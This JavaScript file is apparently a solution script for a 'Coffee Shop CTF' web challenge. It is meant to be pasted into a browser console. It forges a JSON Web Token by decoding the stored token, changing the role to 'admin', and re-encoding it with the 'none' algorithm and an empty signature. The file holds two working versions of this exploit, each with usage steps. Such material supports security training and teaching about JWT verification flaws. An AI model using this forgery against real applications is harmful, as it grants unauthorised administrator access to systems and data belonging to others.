/*
🎯 JWT Privilege Escalation Function for Coffee Shop CTF
Copy and paste this entire function into browser console (F12)

USAGE:
1. Login to the app with any valid credentials
2. Open browser console (F12)  
3. Paste this entire function
4. Run: hackJWT()
5. Refresh page to see admin privileges
*/

function hackJWT() {
  console.log('🚀 JWT Privilege Escalation Starting...');

  // Step 1: Get JWT from localStorage
  const token = localStorage.getItem('jwt_token');

  if (!token) {
    console.error('❌ No JWT token found in localStorage');
    console.log('💡 Please login first to get a JWT token');
    return false;
  }

  console.log('✅ JWT token found in localStorage');

  try {
    // Step 2: Decode JWT payload
    const parts = token.split('.');
    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

    console.log('📖 Current user:', payload.username, '| Current role:', payload.role);

    // Step 3: Create malicious JWT with "none" algorithm
    const maliciousHeader = {
      "alg": "none",
      "typ": "JWT"
    };

    const maliciousPayload = {
      ...payload,
      "role": "admin",
      "escalated": true
    };

    // Step 4: Base64 URL encode
    const base64UrlEncode = (obj) => {
      return btoa(JSON.stringify(obj))
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
    };

    const encodedHeader = base64UrlEncode(maliciousHeader);
    const encodedPayload = base64UrlEncode(maliciousPayload);

    // Step 5: Create JWT with empty signature ("none" algorithm)
    const maliciousJWT = `${encodedHeader}.${encodedPayload}.`;

    // Step 6: Store back in localStorage
    localStorage.setItem('jwt_token', maliciousJWT);

    console.log('✅ JWT bypass successful!');
    console.log('👑 Role escalated to admin');
    console.log('🔄 Refresh the page to see admin privileges');
    console.log('🎯 Try accessing /admin/dashboard');

    return true;

  } catch (error) {
    console.error('❌ JWT bypass failed:', error);
    return false;
  }
}

// Alternative shorter function
function jwtHack() {
  const token = localStorage.getItem('jwt_token');
  if (!token) { console.error('No JWT found. Login first.'); return; }

  const parts = token.split('.');
  const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  payload.role = 'admin';
  payload.escalated = true;

  const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/[+/=]/g, c => ({ '+': '-', '/': '_', '=': '' })[c]);
  const newPayload = btoa(JSON.stringify(payload)).replace(/[+/=]/g, c => ({ '+': '-', '/': '_', '=': '' })[c]);

  localStorage.setItem('jwt_token', `${header}.${newPayload}.`);
  console.log('✅ Admin access granted! Refresh page.');
}

console.log('🎯 JWT Hack functions loaded!');
console.log('📋 Usage: hackJWT() or jwtHack()');